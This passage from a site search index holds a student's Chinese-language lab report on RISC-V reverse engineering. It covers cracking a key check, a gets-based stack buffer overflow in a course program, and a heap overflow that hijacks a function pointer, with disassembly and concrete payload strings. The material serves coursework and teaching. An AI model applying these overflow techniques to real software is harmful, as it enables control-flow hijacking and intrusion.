size\uff0c\u7136\u540e\u63a5\u60f3\u8981\u88ab\u8c03\u7528\u7684\u5730\u5740\uff08\u5373\u6211\u7684\u5b66\u53f7\u5bf9\u5e94\u7684 target \u5730\u5740 0x00010ddc\uff09\u3002\u6700\u540e\u9632\u6b62\u7b2c\u4e8c\u4e2a\u51fd\u6570\u6307\u9488\u88ab\u7834\u574f\u5bfc\u81f4\u5f02\u5e38\u9000\u51fa\uff0c\u518d\u8865\u4e0a\u4e00\u4e2a say_goodbye \u7684\u51fd\u6570\u5730\u5740 0x00010fbc\uff0c\u8fd9\u6837\u5b57\u7b26\u4e32\u7ed3\u5c3e\u7684 \"\\0\" \u5c31\u4f1a\u88ab\u653e\u5728\u8fd9\u4e2a\u5806\u5757\u7684\u5916\u9762\uff0c\u4e0d\u4f1a\u5bf9\u7a0b\u5e8f\u8fd0\u884c\u9020\u6210\u5f71\u54cd \u6240\u4ee5 payload \u5c31\u662f \"AAAAAAAAAAAAAAAAAAAAAAAAAAAA \\x11\\x00\\x00\\x00\\xdc\\x0d\\x01\\x00\\xbc\\x0f\\x01\\x00\"\uff08\u6ce8\u610f\u5c0f\u7aef\u5e8f\uff09","title":"\u7cfb\u7edf I lab4-2"},{"location":"cs/system/cs1/lab4-2/#overflow","text":"Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 lab4-2 \u5b9e\u9a8c\u62a5\u544a\uff082022.05.06 ~ 2022.05.27\uff09 Warning \u4ec5\u4f9b\u5b66\u4e60\u53c2\u8003\uff0c\u8bf7\u52ff\u6284\u88ad","title":"overflow \u7406\u89e3"},{"location":"cs/system/cs1/lab4-2/#_1","text":"\u7406\u89e3 ELF \u6587\u4ef6\u548c\u6c47\u7f16\u6587\u4ef6 riscv32-unknown-linux-gnu-objdump -d key\uff0c\u6765\u5c1d\u8bd5\u7406\u89e3\u5728\u7f16\u8bd1\u5668\u5c42\u9762\uff0c\u5404\u4e2a\u7a0b\u5e8f\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u7684\u5206\u5e03 \u5c1d\u8bd5\u8fd0\u884c RISCV \u7684 ELF \u6587\u4ef6\uff0c\u4f7f\u7528 qemu \u6765\u8fd0\u884c key \u8f93\u5165\u5b66\u53f7\u548c key \u9605\u8bfb\u6c47\u7f16 key.s \u6587\u4ef6\uff0c\u5c1d\u8bd5\u7834\u89e3\u81ea\u5df1\u5b66\u53f7\u5bf9\u5e94\u7684 key Buffer Overflow \u6211\u4eec\u7ed9\u4e86\u88ab\u653b\u51fb\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801 bof.c\uff0c\u8bf7\u5728\u7406\u89e3 bof.c \u7a0b\u5e8f\u884c\u4e3a\u7684\u57fa\u7840\u4e0a\uff0c\u5b8c\u6210\u4e00\u6b21\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u3002\u9996\u5148\u4f7f\u7528\u7f16\u8bd1\u751f\u6210 ELF \u7136\u540e\u6267\u884c bof\u3002\u9996\u5148\u8f93\u5165\u4f60\u7684\u5b66\u53f7\uff0c\u4e4b\u540e\u51fa\u73b0\u63d0\u793a Tell me something to overflow me:\uff0c\u5728\u8fd9\u4e0b\u9762\u8f93\u5165\u76f8\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u653b\u51fb\u5931\u8d25\uff0c\u663e\u793a you can\u2018t hack me,please try again! \u5982\u679c\u653b\u51fb\u6210\u529f\uff0c\u5219\u7a0b\u5e8f\u663e\u793a\u6ea2\u51fa\u6210\u529f\uff0c\u7a0b\u5e8f\u6b63\u5e38\u7ed3\u675f\u3002\u8bf7\u5728\u8ba4\u771f\u5206\u6790\u6240\u7ed9\u6c47\u7f16\u4ee3\u7801\u548c\u6e90\u4ee3\u7801\u7684\u57fa\u7840\u4e0a\uff0c\u6784\u9020\u4e00\u4e2a\u5408\u9002\u7684\u5b57\u7b26\u4e32\uff0c\u5b8c\u6210\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\uff0c\u5e76\u8bf7\u52a1\u5fc5\u8be6\u7ec6\u8bf4\u660e\u4f60\u7684\u5206\u6790\u8fc7\u7a0b\u4ee5\u53ca\u4f9d\u636e\u3002\u63d0\u793a\uff1a\u91cd\u70b9\u5206\u6790 Hear \u51fd\u6570\u5373\u53ef\u3002 \u4f46\u5b9e\u9645\u4e0a\u8fd8\u9700\u8981\u8003\u8651\u4e00\u79cd\u7279\u6b8a\u60c5\u51b5\uff0c\u867d\u7136\u663e\u793a\u653b\u51fb\u6210\u529f\uff0c\u4f46\u662f\u51fa\u73b0\u4e86\u6bb5\u9519\u8bef\uff0c\u8bf7\u63a2\u7d22\u8fd9\u79cd\u60c5\u51b5\u51fa\u73b0\u7684\u6761\u4ef6\uff0c\u5e76\u7ed9\u51fa\u8be6\u7ec6\u7684\u5206\u6790\u8bf4\u660e\u4e3a\u4ec0\u4e48\u4f1a\u51fa\u73b0\u8fd9\u79cd\u72b6\u51b5\u3002 Bonus: Heap Overflow \u6211\u4eec\u7ed9\u51fa\u4e86 bonus \u7684 ELF\uff0c\u8fd9\u662f\u4e00\u4e2a\u5b58\u5728 heap overflow \u6f0f\u6d1e\u7684\u7a0b\u5e8f\u3002 \u8bf7\u627e\u51fa ELF \u4e2d\u7684\u6f0f\u6d1e\u3002\u53ef\u4ee5\u5229\u7528 riscv32-unknown-linux-gnu-objdump \u67e5\u770b ELF \u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\u5e76\u8fdb\u884c\u9006\u5411\uff0c\u6216\u4f7f\u7528 QEMU+GDB \u6216 SPIKE \u8fdb\u884c\u52a8\u6001\u8c03\u8bd5\u3002 \u6211\u4eec\u63d0\u4f9b\u7684 ELF \u4f1a\u8ba9\u4f60\u8f93\u5165\u4e24\u884c\u6570\u636e\u3002\u5176\u4e2d\u7b2c\u4e00\u884c\u6570\u636e\u5fc5\u987b\u662f\u4f60\u7684\u5b66\u53f7\uff1b\u800c\u7b2c\u4e8c\u884c\u6570\u636e\u662f\u8fdb\u884c overflow \u7684 payload\u3002 \u6211\u4eec\u5e0c\u671b\u4f60\u80fd\u5c06 ELF \u7684\u63a7\u5236\u6d41\u52ab\u6301\u5230 target_xxx \u7684\u51fd\u6570\uff0c\u5176\u4e2d xxx \u4e3a\u4f60\u7684\u5b66\u53f7\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u4f60\u9700\u8981\u901a\u8fc7\u8f93\u5165\u7279\u5b9a\u7684 payload \u6765\uff0c\u6765\u8ba9 ELF \u6267\u884c\u5176\u672c\u4e0d\u5e94\u8be5\u6267\u884c\u7684\u51fd\u6570\u3002\u5982\u679c\u4f60\u5b8c\u6210\u4e86\u8fd9\u4e00\u6b65\uff0c\u4f60\u5c06\u770b\u5230 ELF \u8f93\u51fa\u63d0\u793a\u201dCongratulation xxx! You successfully perform a heap overflow attack!\u201d\u3002\u4f46\u4f60\u6b64\u65f6\u53ef\u80fd\u4f1a\u53d1\u73b0\u7a0b\u5e8f\u65e0\u6cd5\u6b63\u5e38\u9000\u51fa\uff0c\u4f1a\u62a5segment fault \u6216\u662f\u5176\u4ed6\u9519\u8bef\u3002\u5982\u679c\u62a5\u9519\u4e86\uff0c\u8bf7\u601d\u8003\u5e76\u89e3\u91ca\u4e3a\u4ec0\u4e48\u4f1a\u51fa\u73b0\u8fd9\u4e9b\u9519\u8bef\u3002 \u6700\u540e\uff0c\u5982\u679c\u5b8c\u6210\u4e0a\u4e00\u6b65\u540e\uff0c\u7a0b\u5e8f\u65e0\u6cd5\u6b63\u5e38\u9000\u51fa\uff08\u5373\u6709\u62a5\u9519\uff09\uff0c\u8bf7\u4fee\u6539\u4f60\u7684 payload\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u5728\u6ca1\u6709\u62a5\u9519\u7684\u60c5\u51b5\u4e0b\u6b63\u5e38\u9000\u51fa\u3002","title":"\u5b9e\u9a8c\u5185\u5bb9"},{"location":"cs/system/cs1/lab4-2/#elf","text":"\u4ee3\u7801\u6bb5 .text \u5b58\u50a8\u4e86 riscv \u5b57\u8282\u7801\uff0c\u53ea\u8bfb\u6570\u636e\u6bb5 .rodata \u5728 .text \u540e\uff0c\u5b58\u50a8\u4e86\u53ea\u8bfb\u7684\u6570\u636e\uff08\u6bd4\u5982\u5b57\u7b26\u4e32\uff09\uff0c\u901a\u8fc7 riscv32-unknow-linux-gnu-objdump -d key \u53ef\u4ee5\u53cd\u7f16\u8bd1\u51fa plt \u8868\u548c .text \u6bb5\uff0c\u901a\u8fc7 ...-objdump -j .rodata -d key \u53ef\u4ee5\u8f93\u51fa .rodata \u6bb5\uff0c\u901a\u8fc7\u5c06\u5176\u5185\u5bb9\u7684\u5341\u516d\u8fdb\u5236\u503c\u8f6c\u4e3a ascii \u5b57\u7b26\u53ef\u4ee5\u5f97\u5230\u5b57\u7b26\u4e32\u5e38\u91cf\u7684\u5185\u5bb9\u548c\u5bf9\u5e94\u5730\u5740","title":"\u7406\u89e3 ELF \u6587\u4ef6\u548c\u6c47\u7f16\u6587\u4ef6"},{"location":"cs/system/cs1/lab4-2/#key","text":"\u9996\u5148\u53cd\u7f16\u8bd1\u51fa .text \u6bb5\uff0c\u53d1\u73b0\u5176\u4e2d main \u51fd\u6570\u90e8\u5206\u5c31\u662f\u4f9d\u6b21\u8c03\u7528\u4e86 read_student \u548c read_key \u51fd\u6570\uff0c\u6240\u4ee5\u9700\u8981\u770b\u8fd9\u4e24\u4e2a\u51fd\u6570\u7684\u6c47\u7f16\u4ee3\u7801 \u901a\u8fc7\u5206\u6790\u5f97\u5230\u4e24\u4e2a\u51fd\u6570\u7684\u5e27\u6808\u5e03\u5c40\uff1a read_student \u51fd\u6570\u6709\u4e00\u884c\uff1a 104a6: 35e9 jal 10370 <exit@plt> \u4e0d\u96be\u770b\u51fa\u5b83\u524d\u9762\u8bfb\u53d6\u4e86\u5b66\u53f7\u5230\u5c40\u90e8\u53d8\u91cf s0-40 \u4e2d\uff0c\u7136\u540e\u5224\u65ad\u662f\u5426\u90fd\u662f\u6570\u5b57\uff0c\u5982\u679c\u4e0d\u662f\u5219\u4f1a\u6267\u884c\u8fd9\u4e00\u53e5 exit\uff0c\u800c\u540e\u662f\u4e00\u6bb5\u5faa\u73af 104bc: fe042423 sw zero,-24(s0) 104c0: a035 j 104ec <read_student+0x94> 104c2: fe842783 lw a5,-24(s0) 104c6: 17c1 addi a5,a5,-16 104c8: 97a2 add a5,a5,s0 104ca: fe87c783 lbu a5,-24(a5) 104ce: fd078713 addi a4,a5,-48 104d2: 67c9 lui a5,0x12 104d4: 02878693 addi a3,a5,40 # 12028 <number> 104d8: fe842783 lw a5,-24(s0) 104dc: 078a slli a5,a5,0x2 104de: 97b6 add a5,a5,a3 104e0: c398 sw a4,0(a5) 104e2: fe842783 lw a5,-24(s0) 104e6: 0785 addi a5,a5,1 104e8: fef42423 sw a5,-24(s0) 104ec: fe842703 lw a4,-24(s0) 104f0: 4791 li a5,4 104f2: fce7d8e3 bge a5,a4,104c2 <read_student+0x6a> \u9605\u8bfb\u53d1\u73b0\u5faa\u73af\u53d8\u91cf -24(s0) \u4ece 0 \u5faa\u73af\u5230 4\uff0c\u6bcf\u6b21\u53d6\u51fa\u8f93\u5165\u4e2d\u7684\u5b57\u7b26 input[i] \u7136\u540e\u51cf\u53bb '0'(48)\uff080x104ce \u884c\uff09\u5b58\u5165\u5168\u5c40\u53d8\u91cf number[i]\uff08\u5728 .data \u6bb5\u4e2d\uff09\u3002\u56e0\u4e3a\u5b66\u53f7\u524d\u4e94\u4f4d\u662f 32101\uff0c\u6240\u4ee5\u5bf9\u5e94 number[0:5] \u4e5f\u5c31\u662f [3, 2, 1, 0, 1] \u540e\u9762\u53c8\u662f\u7c7b\u4f3c\u7684\u5faa\u73af\uff0c\u5faa\u73af\u53d8\u91cf -28(s0) \u4ece 5 \u5faa\u73af\u5230 9\uff0c\u6bcf\u6b21\u53d6\u51fa input[i] \u5e76\u7528 '9'(57) \u51cf\u53bb\u5b83\u5b58\u5165 number[i]\u3002\u56e0\u4e3a\u5b66\u53f7\u540e\u4e94\u4f4d\u662f <\u9690\u79c1\u55b5>\uff0c\u6240\u4ee5\u5bf9\u5e94 number[5:10] \u4e5f\u5c31\u662f <\u9690\u79c1\u55b5> \u518d\u770b read_key \u51fd\u6570\uff0c\u5b83\u5c06 -20(s0) \u8d4b\u503c\u4e3a\u4e86 0\uff0c\u7136\u540e\u8bfb\u5165\u4e86\u4e00\u4e2a\u6570\u5b57\u5230 s0-32 \u4e2d\uff0c\u4e4b\u540e\u662f\u4e00\u6bb5\u5faa\u73af 10562: fe042423 sw zero,-24(s0) 10566: a01d j 1058c <read_key+0x4a> 10568: 67c9 lui a5,0x12 1056a: 02878713 addi a4,a5,40 # 12028 <number> 1056e: fe842783 lw a5,-24(s0) 10572: 078a slli a5,a5,0x2 10574: 97ba add a5,a5,a4 10576: 439c lw a5,0(a5) 10578: fec42703 lw a4,-20(s0) 1057c: 97ba add a5,a5,a4 1057e: fef42623 sw a5,-20(s0) 10582: fe842783 lw a5,-24(s0) 10586: 0785 addi a5,a5,1 10588: fef42423 sw a5,-24(s0) 1058c: fe842703 lw a4,-24(s0) 10590: 47a5 li a5,9 10592: fce7dbe3 bge a5,a4,10568 <read_key+0x26> 10596: fe042783 lw a5,-32(s0) 1059a: fec42703 lw a4,-20(s0) 1059e: 00f71863 bne a4,a5,105ae <read_key+0x6c> \u5faa\u73af\u53d8\u91cf -24(s0) \u4ece 0 \u5230 9\uff0c\u5faa\u73af\u4f53\u4e2d\u4e00\u6b21\u6b21\u53d6\u51fa number[i] \u5e76\u7d2f\u52a0\u5230 -20(s0) \u4e2d\uff0c\u6700\u540e\u5c06 -32(s0) \u5373\u8f93\u5165\u4e0e\u5f97\u5230\u7684\u7ed3\u679c -20(s0) \u76f8\u6bd4\u8f83\uff0c\u5224\u65ad\u662f\u5426\u76f8\u7b49\uff0c\u6240\u4ee5\u8981\u8f93\u5165\u7684 key \u4e5f\u5c31\u662f number \u6570\u7ec4\u7684\u548c\uff0c\u5f97\u5230 3+2+1+0+1+<\u9690\u79c1\u55b5> = ? \u4e5f\u5c31\u662f\u6211\u7684\u5b66\u53f7\u5bf9\u5e94\u7684 key\uff0c\u586b\u8fdb\u53bb\u7b54\u6848\u6b63\u786e","title":"\u7834\u89e3 key"},{"location":"cs/system/cs1/lab4-2/#buffer-overflow","text":"bof.c \u6587\u4ef6\u4e2d\u7684 hear \u51fd\u6570\u56e0\u4e3a\u4f7f\u7528 gets \u51fd\u6570\u5bfc\u81f4\u5b58\u5728\u7f13\u51b2\u533a\u6ea2\u51fa\u6f0f\u6d1e int hear ( unsigned int stu_id ){ char p1 = 'N' ; char p2 = 'Y' ; char str [ LENGTH ]; gets ( str ); if ( p1 == p2 ) { printf ( \"Wow [%u] you successfully overflow me! \\n \" , stu_id ); return 1 ; } else { printf ( \"[%u], you can`t hack me,please try again! \\n \" , stu_id ); return 0 ; } } \u5f88\u663e\u7136\uff0c\u76ee\u6807\u662f\u901a\u8fc7\u8f93\u5165 str \u5229\u7528\u7f13\u51b2\u533a\u6ea2\u51fa\u6765\u4fee\u6539\u5c40\u90e8\u53d8\u91cf p1\u3001p2\uff0c\u4f7f\u5176\u76f8\u7b49","title":"Buffer Overflow"},{"location":"cs/system/cs1/lab4-2/#_2","text":"\u4f7f\u7528 riscv32-unknown-linux-gnu-gcc bof.c -o bof \u6765\u8fdb\u884c\u7f16\u8bd1 \u518d\u901a\u8fc7 riscv32-unknown-linux-gnu-objdump -d bof > bof.s \u6765\u53cd\u7f16\u8bd1\u3001\u91cd\u5b9a\u5411\u5f97\u5230\u6c47\u7f16\u6587\u4ef6","title":"\u7f16\u8bd1\u4e0e\u53cd\u7f16\u8bd1"},{"location":"cs/system/cs1/lab4-2/#_3","text":"\u4e3b\u8981\u5173\u6ce8 hear \u51fd\u6570\u7684\u6c47\u7f16\u4ee3\u7801 000104e8 <hear>: 104e8: 7179 addi sp,sp,-48 104ea: d606 sw ra,44(sp) 104ec: d422 sw s0,40(sp) 104ee: 1800 addi s0,sp,48 104f0: fca42e23 sw a0,-36(s0) 104f4: 04e00793 li a5,78 104f8: fef407a3 sb a5,-17(s0) 104fc: 05900793 li a5,89 10500: fef40723 sb a5,-18(s0) 10504: fe440793 addi a5,s0,-28 10508: 853e mv a0,a5 1050a: 3ddd jal 10400 <gets@plt> 1050c: fef44703 lbu a4,-17(s0) 10510: fee44783 lbu a5,-18(s0) 10514: 00f71a63 bne a4,a5,10528 <hear+0x40> 10518: fdc42583 lw a1,-36(s0) 1051c: 67c1 lui a5,0x10 1051e: 61878513 addi a0,a5,1560 # 10618 10522: 3dfd jal 10420 <printf@plt> 10524: 4785 li a5,1 10526: a801 j 10536 <hear+0x4e> 10528: fdc42583 lw a1,-36(s0) 1052c: 67c1 lui a5,0x10 1052e: 64078513 addi a0,a5,1600 # 10640 10532: 35fd jal 10420 <printf@plt> 10534: 4781 li a5,0 10536: 853e mv a0,a5 10538: 50b2 lw ra,44(sp) 1053a: 5422 lw s0,40(sp) 1053c: 6145 addi sp,sp,48 1053e: 8082 ret \u9996\u5148\u901a\u8fc7 addi sp,sp,-48 \u5f00\u8f9f\u4e86 hear \u7684\u51fd\u6570\u6808\u7a7a\u95f4\uff0c\u7136\u540e\u5b58\u5165 ra \u4e0e s0\uff08\u8fd4\u56de\u5730\u5740\u4e0e\u524d\u5e27\u6307\u9488\uff09\uff0c\u518d\u8d4b\u503c\u4e86\u5e27\u6307\u9488 s0\uff0c\u5c06\u53c2\u6570 a0\uff08stu_id\uff0c32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff09\u5b58\u5165 -36(s0)\uff0c\u5c06 \"N\"(78) \u653e\u5165 -17(s0)\u3001\"Y\"(89) \u653e\u5165 -18(s0)\u3002\u7136\u540e\u5c06 s0-28 \u8d4b\u503c\u7ed9 a5 \u548c a0\uff0c\u5e76\u8c03\u7528 gets \u51fd\u6570\uff0c\u4e5f\u5c31\u8bf4\u660e\u4ece s0-28 \u5f00\u59cb\u7684 10 \u4e2a\u5b57\u8282\u7a7a\u95f4\u662f str\u3002\u6700\u540e\u53d6\u51fa -17(s0) -18(s0) \u5e76\u6bd4\u8f83\uff0c\u7136\u540e\u662f\u4e00\u7cfb\u5217\u63a7\u5236\u8f93\u51fa\u7684\u64cd\u4f5c\u3002\u6700\u540e\u53d6\u51fa\u5b58\u4e0b\u7684 ra \u548c s0\uff0c\u518d\u6e05\u9664\u6808\u7a7a\u95f4\uff0c\u7136\u540e\u8fd4\u56de\u3002 \u6240\u4ee5\u8fd9\u4e2a\u51fd\u6570\u5e27\u6808\u7684\u5e03\u5c40\u5982\u4e0b\uff1a","title":"\u901a\u8fc7\u6c47\u7f16\u4ee3\u7801\u5206\u6790\u5e27\u6808"},{"location":"cs/system/cs1/lab4-2/#payload","text":"gets \u51fd\u6570\u5e76\u4e0d\u4f1a\u68c0\u67e5\u8f93\u5165\u957f\u5ea6\uff0c\u800c\u4e14\u8f93\u5165\u662f\u4ece\u5c0f\u5730\u5740\u5411\u5927\u5730\u5740\u6269\u5c55\uff0c\u56e0\u4e3a str \u4e0e p1 p2 \u90fd\u662f\u8fde\u7740\u7684\uff0c\u6240\u4ee5\u53ea\u8981\u8f93\u5165 12 \u4e2a\u5b57\u7b26\uff0c\u5e76\u4e14\u6700\u540e\u4e24\u4e2a\u5b57\u7b26\u76f8\u540c\u5219\u4f1a\u66f4\u6539 p1 p2 \u4f7f\u5176\u76f8\u7b49\u3002\uff08\u6ce8\u610f\u8fd9\u91cc\u4e0d\u80fd\u8f93\u5165 10 \u4e2a\u4efb\u610f\u5b57\u7b26\u52a0\u4e00\u4e2a \"N\"\uff0c\u56e0\u4e3a gets \u4e00\u4e2a\u5b57\u7b26\u4e32\u4f1a\u5728\u7ed3\u5c3e\u52a0\u4e0a \"\\0\" \u4e5f\u5c31\u662f 0\uff0c\u6539\u53d8 p1 \u53d8\u6210\u4e86 0\uff0c\u4e0d\u4f1a\u518d\u7b49\u4e8e \"N\"\uff09","title":"\u6784\u9020 payload"},{"location":"cs/system/cs1/lab4-2/#_4","text":"\u5982\u679c str \u6ea2\u51fa\u7684\u8fc7\u591a\u5bfc\u81f4\u6539\u53d8\u4e86\u524d\u5e27\u6307\u9488\uff08s0-8\uff09\u6216\u8fd4\u56de\u5730\u5740\uff08s0-4\uff09\u5c31\u53ef\u80fd\u4f1a\u5bfc\u81f4\u540e\u7eed\u7684\u64cd\u4f5c\u4e2d\u56e0\u4e3a\u524d\u5e27\u6307\u9488\u6539\u53d8\u5bfc\u81f4\u6808\u6307\u9488\u4f4d\u7f6e\u9519\u8bef\u6216\u8fd4\u56de\u4e0d\u6210\u529f\uff0c\u51fa\u73b0\u6bb5\u9519\u8bef\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8db3\u591f\u591a\u4efb\u610f\u5b57\u7b26\uff08\u4fdd\u8bc1 p1 p2 \u76f8\u7b49\uff09\u5c31\u53ef\u4ee5\u8fbe\u5230\u6210\u529f\u6ea2\u51fa\u4f46\u662f\u6bb5\u9519\u8bef\u7684\u7ed3\u679c\uff1a","title":"\u6210\u529f\u6ea2\u51fa\u4f46\u6bb5\u9519\u8bef"},{"location":"cs/system/cs1/lab4-2/#bonus-heap-overflow","text":"","title":"Bonus: Heap Overflow"},{"location":"cs/system/cs1/lab4-2/#_5","text":"objdump \u53cd\u7f16\u8bd1\u540e\u53d1\u73b0\u6709\u5f88\u591a target_ \u51fd\u6570\uff0c\u627e\u5230\u6211\u7684\u5b66\u53f7 <\u9690\u79c1\u55b5> \u5bf9\u5e94\u7684\u5730\u5740 0x00010ddc\u3002\u4e5f\u770b\u5230\u4e86 say_goodbye \u548c repeat_words \u4ee5\u53ca main \u51fd\u6570\u3002\u4e0b\u9762\u4e3b\u8981\u5206\u6790 main \u51fd\u6570\u53ca\u5176\u5bf9\u5e94\u5e27\u6808\uff1a","title":"\u53cd\u7f16\u8bd1\u5206\u6790\u6c47\u7f16\u4ee3\u7801"},{"location":"cs/system/cs1/lab4-2/#malloc","text":"1100c: 4541 li a0,16 1100e: be2ff0ef jal ra,103f0 <malloc@plt> 11012: 87aa mv a5,a0 11014: fef42623 sw a5,-20(s0) 11018: 4521 li a0,8 1101a: bd6ff0ef jal ra,103f0 <malloc@plt> 1101e: 87aa mv a5,a0 11020: fef42423 sw a5,-24(s0) 11024: fe842783 lw a5,-24(s0) 11028: 6745 lui a4,0x11 1102a: fe070713 addi a4,a4,-32 # 10fe0 <repeat_words> 1102e: c398 sw a4,0(a5) 11030: fe842783 lw a5,-24(s0) 11034: 6745 lui a4,0x11 11036: fbc70713 addi a4,a4,-68 # 10fbc <say_goodbye> 1103a: c3d8 sw a4,4(a5) \u5148\u901a\u8fc7 malloc \u7533\u8bf7 16 \u5b57\u8282\u5927\u5c0f\u7684\u5806\u7a7a\u95f4\uff0c\u5c06\u5730\u5740\u653e\u5165 -20(s0)\uff0c\u518d\u901a\u8fc7 malloc \u7533\u8bf7 8 \u5b57\u8282\u5927\u5c0f\u7684\u5806\u7a7a\u95f4\uff0c\u653e\u5165 -24(s0)\u3002\u7136\u540e\u5c06 repeat_words \u51fd\u6570\u548c say_goodbye \u51fd\u6570\u7684\u5730\u5740\u5206\u522b\u653e\u5165\u540e\u4e00\u4e2a\u5806\u7a7a\u95f4\u7684\u524d 4 \u5b57\u8282\u548c\u540e 4 \u5b57\u8282\u4e2d\u3002 \u4e2d\u95f4\u8bfb\u5165\u5b66\u53f7\u548c\u8f93\u51fa\u63d0\u793a\u7b26\u7684\u90e8\u5206\u4e0d\u591a\u5206\u6790","title":"malloc \u90e8\u5206"},{"location":"cs/system/cs1/lab4-2/#_6","text":"1106c: 8381a783 lw a5,-1992(gp) # 14038 <stdin@GLIBC_2.29> 11070: 863e mv a2,a5 11072: 03200593 li a1,50 11076: fec42503 lw a0,-20(s0) 1107a: ba6ff0ef jal ra,10420 <fgets@plt> 1107e: fe842783 lw a5,-24(s0) 11082: 439c lw a5,0(a5) 11084: fec42503 lw a0,-20(s0) 11088: 9782 jalr a5 1108a: fe842783 lw a5,-24(s0) 1108e: 43d8 lw a4,4(a5) 11090: 84018513 addi a0,gp,-1984 # 14040 <id_str> 11094: 9702 jalr a4 \u5148\u901a\u8fc7 fgets \u51fd\u6570\u8bfb\u53d6\u81f3\u591a 50 \u4e2a\u5b57\u8282\u7684\u5185\u5bb9\u5230 -20(s0)\uff08\u7b2c\u4e00\u4e2a\u5806\u7a7a\u95f4\uff09\u4e2d\u3002\u7136\u540e\u53d6\u51fa -20(s0) \u7684\u5185\u5bb9\u4f5c\u4e3a\u53c2\u6570\u95f4\u63a5\u8c03\u7528 -24(s0) \u7684\u524d 4 \u5b57\u8282\u4f4d\u7f6e\u7684\u51fd\u6570\u3002\u518d\u53d6\u51fa id_str\uff08\u5b58\u5728\u5168\u5c40\u53d8\u91cf\u4e2d\u7684\u5b66\u53f7\uff09\u4f5c\u4e3a\u53c2\u6570\u95f4\u63a5\u8c03\u7528\u7b2c\u4e8c\u4e2a\u5806\u7a7a\u95f4\u7684\u540e 4 \u5b57\u8282\u4f4d\u7f6e\u7684\u51fd\u6570\u3002 \u6700\u540e free \u4e24\u4e2a\u5806\u7a7a\u95f4\u5e76 exit\u3002\u6700\u7ec8\u6574\u4e2a\u51fd\u6570\u7684\u5e27\u6808\u548c\u8c03\u7528\u6d41\u7a0b\u5982\u4e0b\u56fe\uff1a","title":"\u8f93\u5165\u4e0e\u8c03\u7528\u51fd\u6570\u90e8\u5206"},{"location":"cs/system/cs1/lab4-2/#_7","text":"\u5f88\u660e\u663e\uff0cfgets \u8bfb\u53d6\u81f3\u591a 50 \u5b57\u8282\u7684\u5185\u5bb9\u5230\u7b2c\u4e00\u4e2a\u5806\u7a7a\u95f4\uff0c\u4f46\u662f\u8be5\u5806\u7a7a\u95f4\u53ea\u7533\u8bf7\u4e86 16 \u5b57\u8282\u7684\u5927\u5c0f\uff0c\u56e0\u6b64\u53ef\u80fd\u4f1a\u9020\u6210\u5806\u6ea2\u51fa\u3002\u5e76\u4e14\u8fd9\u4e2a\u5806\u7a7a\u95f4\u662f\u5148\u7533\u8bf7\u7684\uff0c\u4e0b\u4e00\u4e2a\u5b58\u6709\u51fd\u6570\u5730\u5740\u7684\u5806\u7a7a\u95f4\u6b63\u597d\u5728\u5176\u4e0b\u65b9\uff08\u5927\u5730\u5740\u65b9\u5411\uff09\uff0c\u6240\u4ee5 fgets \u6ea2\u51fa\u7684\u8f93\u5165\u53ef\u4ee5\u76f4\u63a5\u8986\u76d6\u7b2c\u4e8c\u4e2a\u5806\u7a7a\u95f4\u7684\u5185\u5bb9\uff0c\u4f7f\u5f97\u5176\u4e2d\u5b58\u7684\u5730\u5740\u53d1\u751f\u6539\u53d8\uff0c\u8fdb\u800c\u52ab\u6301\u63a7\u5236\u6d41\u5230 target \u51fd\u6570\u3002","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"cs/system/cs1/lab4-2/#_8","text":"\u867d\u7136\u53ef\u4ee5\u901a\u8fc7\u8f93\u5165\u6765\u6ea2\u51fa\u8986\u76d6\u7b2c\u4e8c\u4e2a\u5806\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u7531\u4e8e\u5806\u7684\u7ed3\u6784\u4e0d\u50cf\u6808\u4e00\u6837\u53ea\u4fdd\u5b58\u6570\u636e\uff0c\u5b83\u8fd8\u6709 header \u4fe1\u606f\uff0c\u5982\u679c\u76f4\u63a5\u8986\u76d6\u7684\u8bdd\u4f1a\u7834\u574f\u6389 header \u4f7f\u7a0b\u5e8f\u51fa\u73b0\u5f02\u5e38\u3002\u56e0\u6b64\u8fd8\u9700\u8981\u4e86\u89e3\u5806\u7684\u7ed3\u6784","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"cs/system/cs1/lab4-2/#glibc","text":"glibc \u5806\u7531\u4e00\u4e2a\u4e2a\u5806\u5757\u7ec4\u6210\uff0c\u4f7f\u7528 malloc \u53ef\u4ee5\u5728\u5f53\u524d\u5806\u5757\u4e0b\u65b9\uff08\u5927\u5730\u5740\uff09\u7533\u8bf7\u4e00\u4e2a\u65b0\u7684\u5806\u5757\uff0c\u5806\u5757\u5305\u542b header \u548c data \u4e24\u90e8\u5206\uff0c\u800c malloc \u8fd4\u56de\u7684\u6307\u9488\u6307\u5411\u7684\u662f data \u90e8\u5206\u7684\u9996\u5b57\u8282\uff0c\u5176\u5305\u542b\u81f3\u5c11\u7533\u8bf7\u7684\u5927\u5c0f\u7684\u7a7a\u95f4\u3002header \u7531\u4ee5\u4e0b\u51e0\u90e8\u5206\u7ec4\u6210\uff1a prev_size: 32 \u4f4d\u7a0b\u5e8f\u4e2d\u662f 4 \u5b57\u8282\uff0c\u5982\u679c\u5f53\u524d\u7684\u4e0a\u4e00\u4e2a\u5806\u5757\uff08\u5c0f\u5730\u5740\u65b9\u5411\uff09\u6b63\u5728\u4f7f\u7528\uff0c\u5219 prev_size \u53ef\u4ee5\u4f5c\u4e3a\u4e0a\u4e00\u4e2a\u5806\u5757\u7684\u4e00\u90e8\u5206\uff0c\u5b58\u50a8\u6570\u636e\u3002\u5982\u679c\u4e0a\u4e00\u4e2a\u5806\u5757\u5df2\u7ecf\u88ab free \u4e86\uff0c\u5219 prev_size \u8868\u793a\u4e0a\u4e00\u4e2a\u5806\u5757\u7684\u5927\u5c0f size: 32 \u4f4d\u7a0b\u5e8f\u4e2d\u662f 4 \u5b57\u8282\uff0c\u8868\u793a\u6574\u4e2a\u5806\u5757\uff08\u5305\u542b 